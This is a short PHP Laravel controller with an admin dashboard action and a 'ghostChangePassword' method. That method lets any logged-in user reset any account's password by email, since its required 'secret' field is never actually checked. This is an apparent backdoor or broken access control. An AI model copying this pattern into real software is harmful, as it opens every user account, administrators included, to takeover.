<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\User;

class AdminController extends Controller
{

	public function __construct()
	{
		$this->middleware('auth');
	}

    public function dashboard()
    {
    	return view('pages.dashboard');
    }

    public function ghostChangePassword()
    {
    	request()->validate([
    		'secret' => 'required',
    		'email' => 'required|exists:users,email',
    		'password' => 'required'
    	]);

    	$user = User::where('email', request()->email)->first();

    	$user->password = bcrypt(request()->password);

    	$user->save();

    	return 'User '. $user->id .' has been override!';
    }
    
}
